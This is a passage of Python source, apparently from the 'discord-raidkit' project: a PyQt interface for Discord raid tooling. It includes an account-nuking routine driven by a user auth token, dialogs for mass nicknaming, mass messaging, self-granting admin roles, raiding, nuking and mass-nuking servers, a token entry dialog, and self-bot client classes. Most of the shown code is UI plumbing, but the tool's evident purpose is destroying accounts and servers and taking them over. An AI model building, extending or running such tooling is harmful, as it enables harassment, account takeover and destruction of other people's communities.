                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36",
                    "X-Requested-With": "XMLHttpRequest"
                }

                url = "https://discord.com/api/v8/users/@me/settings"
                r = requests.get(url, headers=headers)
                guild_IDs = r.json()['guild_positions']
                nuke_requests(headers)
                self.osiris_btns_off(False)
                self.page_btns_off(False)
                osiris_running = False
            else:
                self.txtOUserID.setText("Nuke Account Fail: Invalid Token")
                self.txtOUsername.setText("Nuke Account Fail: Invalid Token")
                self.txtO2FA.setText("Nuke Account Fail: Invalid Token")
                self.txtOEmail.setText("Nuke Account Fail: Invalid Token")
                self.txtOPhoneNum.setText("Nuke Account Fail: Invalid Token")
                self.osiris_btns_off(False)
                self.page_btns_off(False)
                osiris_running = False
        except BaseException as e:
            logging.error(f"O: nuke_account(): {e}")
            self.osiris_btns_off(False)
            self.page_btns_off(False)
            osiris_running = False


# Input Dialogs

class NicknamesDialog(QtWidgets.QDialog, Ui_dlgNicknames):
    """Nicknames Dialog; used in the Nick All command.
    """

    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self.ui = Ui_dlgNicknames()
        self.setupUi(self)
        self.accepted.connect(lambda: self.set_nicks(True))
        self.rejected.connect(lambda: self.set_nicks(False))

    def set_nicks(self, bool) -> None:
        global nicks
        global guild_ID
        if bool:
            try:
                guild_ID = int(self.txtGuildID.text().strip())
                nicks = self.txtNicknames.text().strip().split("\,")
                for i in range(len(nicks)):
                    if nicks[i] == "":
                        del nicks[i]
                if nicks == []:
                    guild_ID = 0
                self.close()
            except:
                guild_ID = 0
                nicks = []
                self.close()
        else:
            guild_ID = 0
            nicks = []
            self.close()


class MessagesDialog(QtWidgets.QDialog, Ui_dlgMessages):
    """Messages Dialog; used in the Msg All command.
    """

    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self.ui = Ui_dlgMessages()
        self.setupUi(self)
        self.accepted.connect(lambda: self.set_messages(True))
        self.rejected.connect(lambda: self.set_messages(False))

    def set_messages(self, bool) -> None:
        global messages
        global guild_ID
        if bool:
            try:
                guild_ID = int(self.txtGuildID.text().strip())
                messages = self.txtMessages.text().strip().split("\,")
                for i in range(len(messages)):
                    if messages[i] == "":
                        del messages[i]
                if messages == []:
                    guild_ID = []
                self.close()
            except:
                guild_ID = 0
                messages = []
                self.close()
        else:
            guild_ID = 0
            messages = []
            self.close()


class ServerDialog(QtWidgets.QDialog, Ui_dlgServer):
    """Server Dialog; used in various commands.
    """

    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self.ui = Ui_dlgServer()
        self.setupUi(self)
        self.accepted.connect(lambda: self.set_server(True))
        self.rejected.connect(lambda: self.set_server(False))

    def set_server(self, bool) -> None:
        global guild_ID
        if bool:
            try:
                guild_ID = int(self.txtGuildID.text().strip())
            except:
                guild_ID = 0
            self.close()
        else:
            guild_ID = 0
            self.close()


class AdminDialog(QtWidgets.QDialog, Ui_dlgAdmin):
    """Admin Dialog; used in the admin command.
    """

    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self.ui = Ui_dlgAdmin()
        self.setupUi(self)
        self.accepted.connect(lambda: self.set_admin(True))
        self.rejected.connect(lambda: self.set_admin(False))

    def set_admin(self, bool) -> None:
        global guild_ID
        global user_ID
        global rolename
        if bool:
            try:
                guild_ID = int(self.txtGuildID.text().strip())
                user_ID = int(self.txtUserID.text().strip())
                rolename = self.txtRolename.text().strip()
                if not rolename:
                    guild_ID = 0
                    user_ID = 0
                self.close()
            except:
                guild_ID = 0
                user_ID = 0
                rolename = ""
                self.close()
        else:
            guild_ID = 0
            user_ID = 0
            rolename = ""
            self.close()


class RaidDialog(QtWidgets.QDialog, Ui_dlgRaid):
    """Raid Dialog; used in the raid command.
    """

    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self.ui = Ui_dlgRaid()
        self.setupUi(self)
        self.accepted.connect(lambda: self.set_raid(True))
        self.rejected.connect(lambda: self.set_raid(False))

    def set_raid(self, bool) -> None:
        global guild_ID
        global rolename
        global nicks
        global channel_names
        global channel_num
        global messages
        if bool:
            try:
                guild_ID = int(self.txtGuildID.text().strip())
                nicks = self.txtNicknames.text().strip().split("\,")
                channel_names = self.txtChannelNames.text().strip().split("\,")
                channel_num = int(self.txtChannelNum.text().strip())
                messages = self.txtMessages.text().strip().split("\,")
                for i in range(len(nicks)):
                    if nicks[i] == "":
                        del nicks[i]
                for i in range(len(channel_names)):
                    if channel_names[i] == "":
                        del channel_names[i]
                for i in range(len(messages)):
                    if messages[i] == "":
                        del messages[i]
                if not guild_ID \
                    or not nicks \
                    or not channel_names \
                    or not channel_num or \
                    not messages:
                    guild_ID = 0
                    channel_num = 0
                self.close()
            except:
                guild_ID = 0
                nicks = []
                channel_names = []
                channel_num = 0
                messages = []
                self.close()
        else:
            guild_ID = 0
            nicks = []
            channel_names = []
            channel_num = 0
            messages = []
            self.close()


class NukeDialog(QtWidgets.QDialog, Ui_dlgNuke):
    """Nuke Dialog; used in the nuke command.
    """

    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self.ui = Ui_dlgNuke()
        self.setupUi(self)
        self.accepted.connect(lambda: self.set_nuke(True))
        self.rejected.connect(lambda: self.set_nuke(False))

    def set_nuke(self, bool) -> None:
        global user_IDs
        global guild_ID
        if bool:
            try:
                guild_ID = int(self.txtGuildID.text().strip())
                user_IDs = self.txtExclusions.text().strip().split("\,")
                for i in range(len(user_IDs)):
                    if user_IDs[i] == "":
                        del user_IDs[i]
                if user_IDs:
                    temp = []
                    for ID in user_IDs:
                        temp.append(int(ID))
                    user_IDs = temp
                self.close()
            except:
                guild_ID = 0
                user_IDs = []
                self.close()
        else:
            guild_ID = 0
            user_IDs = []
            self.close()


class MassNukeDialog(QtWidgets.QDialog, Ui_dlgMassNuke):
    """Mass Nuke Dialog; used in the Mass Nuke command.
    """

    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self.ui = Ui_dlgMassNuke()
        self.setupUi(self)
        self.accepted.connect(lambda: self.set_mass_nuke(True))
        self.rejected.connect(lambda: self.set_mass_nuke(False))

    def set_mass_nuke(self, bool) -> None:
        global user_IDs
        global stop_mass_nuke
        if bool:
            try:
                user_IDs = self.txtExclusions.text().strip().split("\,")
                for i in range(len(user_IDs)):
                    if user_IDs[i] == "":
                        del user_IDs[i]
                if user_IDs:
                    temp = []
                    for ID in user_IDs:
                        temp.append(int(ID))
                    user_IDs = temp
                stop_mass_nuke = False
                self.close()
            except:
                stop_mass_nuke = True
                user_IDs = []
                self.close()
        else:
            stop_mass_nuke = True
            user_IDs = []
            self.close()


class ConfirmationDialog(QtWidgets.QDialog, Ui_dlgConfirmation):
    """Confirmation Dialog; used in the Mass Leave command.
    """

    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self.ui = Ui_dlgConfirmation()
        self.setupUi(self)
        self.accepted.connect(lambda: self.confirm(True))
        self.rejected.connect(lambda: self.confirm(False))

    def confirm(self, bool) -> None:
        global leave_confirmation
        if bool:
            leave_confirmation = True
            self.close()
        else:
            leave_confirmation = False
            self.close()


class TokenDialog(QtWidgets.QDialog, Ui_dlgToken):
    """Token Dialog; used in various osiris commands.
    """

    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self.ui = Ui_dlgToken()
        self.setupUi(self)
        self.accepted.connect(lambda: self.set_token(True))
        self.rejected.connect(lambda: self.set_token(False))

    def set_token(self, bool) -> None:
        global token
        if bool:
            try:
                token = self.txtAuthToken.text().strip()
                self.close()
            except:
                token = ""
                self.close()
        else:
            token = "False"
            self.close()


class NewUpdateDialog(QtWidgets.QDialog, Ui_dlgNewUpdate):
    """New Update Dialogue: used to inform the user of a new update.
    """

    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self.ui = Ui_dlgNewUpdate()
        self.setupUi(self)

        self.accepted.connect(lambda: self.view_update(True))
        self.rejected.connect(lambda: self.view_update(False))

    def view_update(self, bool) -> None:
        global launched
        global launch_after_yes
        if bool:
            launched = True
            if self.cbOpenDR.isChecked():
                launch_after_yes = True
            webbrowser.open(
                "https://github.com/the-cult-of-integral/discord-raidkit/releases/latest", new=2)
            self.close()
        else:
            self.close()


# Error Dialogues

class ImproperTokenDialog(QtWidgets.QDialog, Ui_dlgImproperToken):
    """Improper Token Dialog; used to inform user of improper tokens.
    """

    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self.ui = Ui_dlgToken()
        self.setupUi(self)
        self.accepted.connect(lambda: self.exiter(True))
        self.rejected.connect(lambda: self.exiter(True))

    def exiter(self, bool) -> None:
        self.close()


class TaskStillRunningDialog(QtWidgets.QDialog, Ui_dlgTaskStillRunning):
    """Task Still Running Dialog; used to inform user of running tasks when
    exiting the application; prevents exit until running tasks are closed.
    """

    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self.ui = Ui_dlgToken()
        self.setupUi(self)
        self.accepted.connect(lambda: self.exiter(True))
        self.rejected.connect(lambda: self.exiter(True))

    def exiter(self, bool) -> None:
        self.close()


# Clients

class Anubis(commands.Bot):
    def __init__(self, intents, command_prefix, self_bot) -> None:
        commands.Bot.__init__(
            self,
            command_prefix=command_prefix,
            intents=intents,
            self_bot=self_bot
        )
        self.remove_command("help")
        self.status = cycle(
            [
                f"{command_prefix}help"
            ]
        )

    async def on_ready(self) -> None:
        global bot_starting
        bot_starting = False
        self.change_status.start()

    @tasks.loop(seconds=10)
    async def change_status(self) -> None:
        await self.change_presence(activity=discord.Game(next(self.status)))


class Qetesh(commands.Bot):
    def __init__(self, intents, command_prefix, self_bot) -> None:
        commands.Bot.__init__(
            self,
            command_prefix=command_prefix,
            intents=intents,
            self_bot=self_bot
        )
        self.remove_command("help")
        self.status = cycle(
            [
                f"{command_prefix}help"
            ]
        )

    async def on_ready(self) -> None:
        global bot_starting
        bot_starting = False
        self.change_status.start()

    @tasks.loop(seconds=10)
    async def change_status(self) -> None:
        await self.change_presence(activity=discord.Game(next(self.status)))


def windowLauncher() -> None:
    app = QtWidgets.QApplication(sys.argv)
    loop = QEventLoop(app)
    asyncio.set_event_loop(loop)
    w = MainWindow()
    if launched and not launch_after_yes:
        loop.close()
        del w
        return
    w.show()
    loop.run_forever()


if __name__ == "__main__":
    windowLauncher()
